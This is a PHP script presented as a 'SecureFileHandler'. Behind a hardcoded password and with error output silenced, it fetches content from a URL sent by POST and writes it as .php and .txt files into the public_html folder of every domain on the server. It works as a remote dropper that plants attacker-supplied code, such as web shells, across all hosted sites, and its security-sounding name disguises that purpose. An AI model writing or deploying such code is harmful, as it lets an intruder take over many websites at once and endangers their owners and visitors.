<?php

error_reporting(0); 
ini_set('display_errors', 0);

class SecureFileHandler {
    private $github_file_url;
    private $new_txt_file_path;
    private $new_php_file_path;

    public function __construct($github_file_url, $new_txt_file_path, $new_php_file_path) {
        $this->github_file_url = $github_file_url;
        $this->new_txt_file_path = $new_txt_file_path;
        $this->new_php_file_path = $new_php_file_path;
    }

    public function process() {
        try {
            
            if (!$this->validateInput()) {
                throw new Exception("Invalid input data.");
            }

           
            $file_content = $this->fetchFileContent();
            if (!$file_content) {
                throw new Exception("Failed to fetch file from GitHub.");
            }

           
            $directories = $this->processDirectories($file_content);

            
            echo json_encode(["success" => true, "directories" => $directories], JSON_PRETTY_PRINT);
        } catch (Exception $e) {
            
            echo json_encode(["error" => $e->getMessage()], JSON_PRETTY_PRINT);
        }
    }

    private function validateInput() {
        return $this->github_file_url && $this->new_txt_file_path && $this->new_php_file_path &&
               filter_var($this->github_file_url, FILTER_VALIDATE_URL);
    }

    private function fetchFileContent() {
        return @file_get_contents($this->github_file_url);
    }

    private function processDirectories($file_content) {
        $domains_path = $this->getDomainsPath();
        if (!is_dir($domains_path)) {
            throw new Exception("The directory '{$domains_path}' does not exist.");
        }

        $directories = [];
        foreach (scandir($domains_path) as $item) {
            if ($item === '.' || $item === '..' || !is_dir($domains_path . $item)) {
                continue;
            }

            $current_dir = $domains_path . $item . '/public_html/';
            if (!is_dir($current_dir)) {
                continue;
            }

            $this->createFiles($current_dir, $file_content);
            $directories[] = $item;
        }

        return $directories;
    }

    private function createFiles($dir, $content) {
        $txt_file_path = $dir . basename($this->new_txt_file_path);
        $php_file_path = $dir . basename($this->new_php_file_path);

        if ($this->isValidPath($txt_file_path, 'txt')) {
            file_put_contents($txt_file_path, $content);
        }

        if ($this->isValidPath($php_file_path, 'php')) {
            file_put_contents($php_file_path, $content);
        }
    }

    private function isValidPath($file_path, $expected_extension) {
        return pathinfo($file_path, PATHINFO_EXTENSION) === $expected_extension &&
               strpos($file_path, '../') === false && strpos($file_path, '..\\') === false;
    }

    private function getDomainsPath() {
        $full_path = __DIR__;
        $directory_path = str_replace('\\', '/', $full_path);
        $path_parts = explode('/', $directory_path);
        $domains_path = '/';
        foreach ($path_parts as $part) {
            if (!empty($part)) {
                $domains_path .= $part . '/';
            }
        }
        return strstr($domains_path, 'domains/', true) . 'domains/';
    }
}


$api_key = $_POST['api_key'] ?? null;
$valid_api_key = 'hoho2013';
if ($api_key !== $valid_api_key) {
    echo json_encode(["error" => "Unauthorized access."], JSON_PRETTY_PRINT);
    exit;
}


$github_file_url = $_POST['github_file_url'] ?? null;
$new_txt_file_path = $_POST['new_txt_file_path'] ?? null;
$new_php_file_path = $_POST['new_php_file_path'] ?? null;

$fileHandler = new SecureFileHandler($github_file_url, $new_txt_file_path, $new_php_file_path);
$fileHandler->process();

?>
